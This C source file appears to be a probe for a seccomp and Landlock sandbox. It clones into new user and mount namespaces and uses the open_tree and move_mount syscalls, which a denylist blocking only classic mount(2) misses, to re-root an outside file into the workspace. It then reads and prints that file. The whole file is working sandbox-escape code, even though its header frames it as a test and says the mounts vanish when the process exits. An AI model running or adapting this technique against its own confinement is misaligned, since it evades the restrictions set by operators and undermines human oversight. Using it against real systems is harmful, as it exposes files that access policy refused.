/*
 * mount_ingest.c — probe for the seccomp denylist missing the new mount API.
 *
 * bailey filters classic mount(2). The new mount API is a different syscall
 * pair: open_tree(428) and move_mount(429). Filters written as a denylist of
 * classic names tend to miss both, and both only need CAP_SYS_ADMIN over the
 * owning user namespace — which clone(CLONE_NEWUSER) hands out (see V6 and
 * tools/userns_clone.c). If open_tree+move_mount re-root a foreign file
 * inside the workspace, the policy then grants what it refused at the
 * original path: Landlock evaluates the path, and the path is now local.
 *
 * Sequence: the parent clones a child into CLONE_NEWUSER|CLONE_NEWNS. The
 * child signals READY over a pipe and blocks; the parent writes the child's
 * setgroups/uid_map/gid_map (the unprivileged-legal self-uid mapping, which
 * must be written from outside the new namespace here), then sends GO. The
 * child then tries open_tree + move_mount, reads through the re-rooted path,
 * and also tries classic mount(2) as the control. Every step prints one
 * STATUS line, so a FAIL names exactly which gate was missing.
 *
 * All mounts live in the child's own mount namespace and vanish when it
 * exits. No host state survives.
 *
 * Build:  cc -O2 -o mount_ingest mount_ingest.c
 * Usage:  mount_ingest <target-file> <destdir>
 *   destdir must exist (the child creates view dirs inside it).
 * Exit:   0 = foreign content read (n > 0) through the re-rooted path,
 *         1 = clone blocked, 2 = setup failure, 3 = mounts refused,
 *         4 = mount ok but the re-rooted read failed.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

/* New mount API constants; older glibc <sys/mount.h> does not ship them. */
#ifndef OPEN_TREE_CLONE
#define OPEN_TREE_CLONE 1
#endif
#ifndef MOVE_MOUNT_F_EMPTY_PATH
#define MOVE_MOUNT_F_EMPTY_PATH 0x00000004
#endif
#ifndef AT_RECURSIVE
#define AT_RECURSIVE 0x8000
#endif

#define STATUS(name, ok, err)                                                  \
    dprintf(1, "STATUS %s %s %s\n", name, (ok) ? "ok" : "denied",              \
            (ok) ? "-" : strerror(err))

static int child(void *arg) {
    const char **argv = (const char **)arg;
    const char *target = argv[0];
    const char *destdir = argv[1];
    int ready_fd = (int)(long)argv[2];
    int go_fd = (int)(long)argv[3];
    char dest[512], dest2[512], buf[48];
    ssize_t n;

    /* Tell the parent we exist; it writes our uid map from outside. */
    if (write(ready_fd, "R", 1) != 1)
        _exit(2);
    char verdict = 0;
    if (read(go_fd, &verdict, 1) != 1)
        _exit(2);
    if (verdict == 'F') {
        dprintf(1, "STATUS map denied %s\n", strerror(errno));
    } else {
        dprintf(1, "STATUS map ok -\n");
    }
    close(ready_fd);
    close(go_fd);

    snprintf(dest, sizeof(dest), "%s/view", destdir);
    snprintf(dest2, sizeof(dest2), "%s/view2", destdir);

    /* The route under test: open_tree + move_mount. */
    int fd = syscall(428, AT_FDCWD, target, O_PATH | OPEN_TREE_CLONE, 0);
    if (fd < 0) {
        STATUS("opentree", 0, errno);
    } else {
        STATUS("opentree", 1, 0);
        if (syscall(429, fd, "", AT_FDCWD, dest, MOVE_MOUNT_F_EMPTY_PATH, 0) < 0)
            STATUS("movemount", 0, errno);
        else
            STATUS("movemount", 1, 0);
        close(fd);
    }

    /* The control: classic mount(2), which the filter is known to deny. */
    if (mount(target, dest2, NULL, MS_BIND, NULL) < 0)
        STATUS("mountbind", 0, errno);
    else
        STATUS("mountbind", 1, 0);

    /* Read the re-rooted inode through its workspace path. */
    int rf = open(dest, O_RDONLY);
    if (rf < 0) {
        dprintf(1, "STATUS readdeny denied %s\n", strerror(errno));
        _exit(4);
    }
    n = read(rf, buf, sizeof(buf));
    int rderr = errno;
    close(rf);
    if (n <= 0) {
        dprintf(1, "STATUS read denied %s\n", n < 0 ? strerror(rderr) : "empty");
        _exit(4);
    }
    dprintf(1, "STATUS read ok %zd\n", n);
    dprintf(1, "READ %.*s\n", (int)n, buf);
    _exit(0);
}

static int write_file_fmt(const char *path, const char *fmt, ...) {
    char buf[128];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    int fd = open(path, O_WRONLY);
    if (fd < 0)
        return -1;
    ssize_t n = write(fd, buf, strlen(buf));
    close(fd);
    return n < 0 ? -1 : 0;
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <target-file> <destdir>\n", argv[0]);
        return 2;
    }
    char dest[512], dest2[512];
    snprintf(dest, sizeof(dest), "%s/view", argv[2]);
    snprintf(dest2, sizeof(dest2), "%s/view2", argv[2]);
    if (mkdir(dest, 0700) < 0 && errno != EEXIST)
        return 2;
    if (mkdir(dest2, 0700) < 0 && errno != EEXIST)
        return 2;

    const size_t stack_size = 1 << 20;
    char *stack = malloc(stack_size);
    if (!stack)
        return 2;
    int ready[2], go[2];
    if (pipe(ready) < 0 || pipe(go) < 0)
        return 2;
    const char *child_argv[4] = {argv[1], argv[2], (const char *)(long)ready[1],
                                 (const char *)(long)go[0]};
    int pid = clone(child, stack + stack_size,
                    CLONE_NEWUSER | CLONE_NEWNS | SIGCHLD, child_argv);
    if (pid < 0) {
        STATUS("clone", 0, errno);
        return 1;
    }
    close(ready[1]);
    close(go[0]);

    char c;
    if (read(ready[0], &c, 1) != 1) {
        waitpid(pid, NULL, 0);
        return 2;
    }
    /* The unprivileged-legal mapping: our own uid, written from outside the
     * new namespace, as userns_create(7) documents. */
    char path[128];
    int mapok = 0;
    snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
    mapok |= (write_file_fmt(path, "deny") == 0) ? 0 : 1;  /* best effort */
    snprintf(path, sizeof(path), "/proc/%d/uid_map", pid);
    int r1 = write_file_fmt(path, "0 %d 1\n", getuid());
    snprintf(path, sizeof(path), "/proc/%d/gid_map", pid);
    int r2 = write_file_fmt(path, "0 %d 1\n", getgid());
    mapok = (r1 == 0 && r2 == 0);
    if (write(go[1], mapok ? "G" : "F", 1) != 1) {
        /* child stays blocked; kill it */
        kill(pid, SIGKILL);
        return 2;
    }
    close(ready[0]);
    close(go[1]);
    int status = 0;
    if (waitpid(pid, &status, 0) < 0)
        return 2;
    return WIFEXITED(status) ? WEXITSTATUS(status) : 2;
}
